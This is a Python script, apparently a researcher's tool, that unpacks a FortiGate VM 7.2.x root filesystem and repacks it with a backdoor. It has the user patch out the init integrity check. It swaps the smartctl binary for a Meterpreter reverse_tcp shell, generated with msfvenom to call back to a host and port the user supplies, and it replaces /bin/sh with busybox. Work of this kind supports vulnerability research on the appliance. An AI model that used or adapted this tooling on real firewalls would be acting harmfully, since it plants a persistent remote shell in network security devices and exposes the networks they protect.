"""
FortiGate automatic repack script v0.2
Copyright (C) 2023  CataLpa

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import os

ORIGINAL = "./ori"
WORKING = "./working_temp"
BACKUP = "./backup"

def clean():
    try:
        os.system("sudo rm -rf %s" % WORKING)
    except Exception as e:
        print("Error: clean failed")
        print(e)
        exit(0)

def check_env():
    try:
        print("[*] Checking env")
        if not os.path.isdir(ORIGINAL):
            print("Error: missing directory \"%s\"" % ORIGINAL)
            exit(0)
        if not os.path.isfile("%s/rootfs.gz" % ORIGINAL):
            print("Error: missing file \"%s/rootfs.gz\"" % ORIGINAL)
            exit(0)
        if not os.path.isfile("%s/busybox" % ORIGINAL):
            print("Error: missing file \"busybox\"")
            exit(0)
        if not os.path.isfile("/bin/busybox"):
            print("Error: missing file \"/bin/busybox\"")
            exit(0)
        if not os.path.isfile("%s/rev_shell" % ORIGINAL):
            print("Error: missing file \"rev_shell\"")
            print("Do you want to generate one (Y/N)? (msfvenom required)")
            _choice = input()
            if _choice == "Y":
                print("Notice: You should to manually execute the \"msfvenom\" command at least once.")
                print("LHOST: ")
                _lhost = input()
                print("LPORT: ")
                _lport = input()
                os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > %s/rev_shell" % (_lhost, _lport, ORIGINAL))
                
                if not os.path.isfile("%s/rev_shell" % ORIGINAL):
                    print("Error: failed")
                    exit(0)
            else:
                exit(0)
        
        os.mkdir(WORKING)
        if not os.path.isdir(WORKING):
            print("Error: cannot create directory \"%s\"" % WORKING)
            exit(0)
        
        os.mkdir(BACKUP)
        if not os.path.isdir(BACKUP):
            print("Error: cannot create directory \"%s\"" % BACKUP)
            exit(0)
    except Exception as e:
        print("Error: %s" % e)
        exit(0)

def unpack_rfs():
    try:
        print("[*] Unpacking rootfs.gz")
        os.system("cp %s/rootfs.gz %s" % (ORIGINAL, WORKING))
        os.system("cd %s && gzip -d ./rootfs.gz" % WORKING)
        os.system("cd %s && sudo cpio -idm < ./rootfs" % WORKING)

        if not os.path.isfile("%s/bin.tar.xz" % WORKING):
            print("Error: unpack failed")
            clean()
            exit(0)
        
        os.system("rm -rf %s/rootfs" % WORKING)
        
        key_files = ["bin.tar.xz", "migadmin.tar.xz", "node-scripts.tar.xz", "usr.tar.xz"]
        for _file in key_files:
            os.system("sudo cp %s/%s %s/%s.tmpbak" % (WORKING, _file, WORKING, _file))
            os.system("cd %s && sudo chroot . /sbin/xz --check=sha256 -d /%s" % (WORKING, _file))
            os.system("cd %s && sudo chroot . /sbin/ftar -xf /%s" % (WORKING, _file[:-3]))
            os.system("sudo rm -rf %s/%s" % (WORKING, _file[:-3]))
            os.system("sudo mv %s/%s.tmpbak %s/%s" % (WORKING, _file, WORKING, _file))
    except Exception as e:
        print("Error: %s" % e)
        exit(0)

def patch_init():    # TODO: Patch it manually for now!
    try:
        os.system("cp %s/bin/init ./" % WORKING)
        print("[*] auto-patch is not supported in this version.")
        print("[*] please patch \"./init\", disable rootfs check manually.\n    And rename it \"./init.patched\"")
        print("[*] input \"DONE\" when finish. Or \"EXIT\" to exit.")
        while True:
            _check = input()
            if _check == "DONE":
                if not os.path.isfile("./init.patched"):
                    print("Error: cannot find patched file")
                    clean()
                    exit(0)
                return
            elif _check == "EXIT":
                exit(0)
            else:
                print("[!] Invalid input!")
    except Exception as e:
        print("Error: %s" % e)
        exit(0)

def repack():
    try:
        print("[*] Repacking")
        os.system("sudo mv %s/bin/init %s/" % (WORKING, BACKUP))
        os.system("sudo mv %s/bin/smartctl %s/" % (WORKING, BACKUP))
        os.system("sudo mv ./init.patched %s/bin/init" % WORKING)
        os.system("sudo cp %s/rev_shell %s/bin/smartctl" % (ORIGINAL, WORKING))
        os.system("sudo chmod 755 %s/bin/init %s/bin/smartctl" % (WORKING, WORKING))
        os.system("sudo chown root:root %s/bin/init %s/bin/smartctl" % (WORKING, WORKING))
        
        os.system("sudo cp %s/busybox %s/bin/busybox" % (ORIGINAL, WORKING))
        os.system("sudo chmod 777 %s/bin/busybox" % WORKING)
        os.system("sudo rm -rf %s/bin/sh" % WORKING)
        os.system("cd %s/bin && sudo ln -s /bin/busybox sh" % WORKING)

        os.system("cd %s && sudo sh -c 'find . | cpio -H newc -o > ../rootfs'" % WORKING)
        os.system("sudo chmod 777 ./rootfs")
        os.system("cat ./rootfs | gzip > ./rootfs.gz")
        os.system("sudo rm -rf ./rootfs ./init")
    except Exception as e:
        print("Error: %s" % e)
        exit(0)

if __name__ == "__main__":
    print("FortiGate VM 7.2.x automatic repack script v0.2")
    print("Author: CataLpa @ 20230704")

    check_env()
    unpack_rfs()
    patch_init()
    repack()
    clean()

    print("[+] Done!")
